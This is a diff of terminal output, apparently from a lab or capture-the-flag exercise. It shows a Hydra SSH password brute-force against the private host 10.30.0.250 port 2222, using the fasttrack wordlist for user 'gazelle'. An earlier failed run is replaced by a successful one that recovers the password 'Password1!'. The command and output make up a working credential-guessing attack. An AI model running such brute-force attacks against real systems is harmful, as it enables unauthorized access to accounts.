@@ -1,12 +1,16 @@
+ sudo hydra -t 1 -l gazelle -P /usr/share/wordlists/fasttrack.txt -s 2222 10.30.0.250 ssh 
+
+[sudo] password for kali: 
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-06 08:03:27
-[DATA] max 4 tasks per 1 server, overall 4 tasks, 262 login tries (l:1/p:262), ~66 tries per task
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-06 08:32:53
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 1 task per 1 server, overall 1 task, 262 login tries (l:1/p:262), ~262 tries per task
 [DATA] attacking ssh://10.30.0.250:2222/
-[ERROR] all children were disabled due too many connection errors
-0 of 1 target completed, 0 valid password found
-[INFO] Writing restore file because 2 server scans could not be completed
-The session file ./hydra.restore was written. Type "hydra -R" to resume session.
-[ERROR] 1 target was disabled because of too many errors
-[ERROR] 1 targets did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-06 08:04:05
+[STATUS] 16.00 tries/min, 16 tries in 00:01h, 246 to do in 00:16h, 1 active
+[STATUS] 15.33 tries/min, 46 tries in 00:03h, 216 to do in 00:15h, 1 active
+[2222][ssh] host: 10.30.0.250   login: gazelle   password: Password1!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-06 08:39:31
+                                                                                                                                  
+┌──(kali㉿kali)-[~]
